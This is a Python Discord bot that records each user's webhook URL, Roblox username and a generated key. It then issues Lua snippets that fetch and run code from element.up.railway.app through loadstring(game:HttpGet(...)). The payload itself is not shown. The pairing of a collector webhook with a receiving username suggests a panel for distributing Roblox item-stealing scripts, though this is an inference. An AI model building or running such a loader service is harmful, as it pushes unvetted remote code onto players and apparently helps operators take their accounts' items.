import os
import discord
from discord import app_commands
from discord.ext import commands
from supabase import create_client, Client
import secrets
import uuid

# ---------------------------
# CONFIG
# ---------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ---------------------------
# HELPERS
# ---------------------------
def generate_key():
    return "ELEMENT$" + secrets.token_urlsafe(24)


# ---------------------------
# ON READY
# ---------------------------
@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Bot connected as {bot.user}")


# ---------------------------
# SET WEBHOOK
# ---------------------------
@tree.command(name="setwebhook", description="Set your webhook")
async def set_webhook(interaction: discord.Interaction, webhook: str):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
    if existing.data:
        supabase.table("elements").update({"webhook": webhook}).eq("user_id", user_id).execute()
    else:
        supabase.table("elements").insert({"user_id": user_id, "webhook": webhook}).execute()

    await interaction.response.send_message(f"✅ Webhook set `{webhook}`", ephemeral=True)


# ---------------------------
# SET USERNAME
# ---------------------------
@tree.command(name="setusername", description="Set your Roblox username")
async def set_username(interaction: discord.Interaction, username: str):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id").eq("user_id", user_id).execute()
    if existing.data:
        supabase.table("elements").update({"username": username}).eq("user_id", user_id).execute()
    else:
        supabase.table("elements").insert({"user_id": user_id, "username": username}).execute()

    await interaction.response.send_message(f"✅ Username set `{username}`", ephemeral=True)


# ---------------------------
# GENERATE ELEMENT SCRIPT
# ---------------------------
@tree.command(name="generate", description="Generate your Element Script")
async def generate(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    existing = supabase.table("elements").select("id, webhook, username").eq("user_id", user_id).execute()

    if not existing.data:
        await interaction.response.send_message(
            "❌ Please set webhook and username first using `/setwebhook` and `/setusername`.",
            ephemeral=True
        )
        return

    element = existing.data[0]
    element_id = element["id"]
    webhook = element.get("webhook", "⚠️ Not set")
    username = element.get("username", "⚠️ Not set")

    script = f"""## Your Element Script
Webhook: `{webhook}`
Username: `{username}`

```lua
ID="{element_id}"
loadstring(game:HttpGet("https://element.up.railway.app/cdn/element.luau"))()
```"""

    await interaction.response.send_message(script, ephemeral=True)


# ---------------------------
# GENERATE AUTOJOINER SCRIPT
# ---------------------------
@tree.command(name="generate-autojoiner", description="Generate your Auto Joiner Script")
async def generate_autojoiner(interaction: discord.Interaction):
    user_id = str(interaction.user.id)

    existing = supabase.table("elements").select("id, key").eq("user_id", user_id).execute()

    if existing.data:
        element = existing.data[0]
        element_id = element["id"]
        key = element.get("key")
    else:
        element_id = str(uuid.uuid4())
        key = generate_key()
        supabase.table("elements").insert({
            "user_id": user_id,
            "id": element_id,
            "key": key
        }).execute()

    if not key:
        key = generate_key()
        supabase.table("elements").update({"key": key}).eq("user_id", user_id).execute()

    script = f"""## ⚠️ DON'T SHARE! THIS CONTAINS YOUR PRIVATE KEY! ⚠️

```lua
KEY="{key}"
loadstring(game:HttpGet("https://element.up.railway.app/cdn/autojoiner.luau"))()
```"""

    await interaction.response.send_message(script, ephemeral=True)


# ---------------------------
# RUN
# ---------------------------
bot.run(TOKEN)
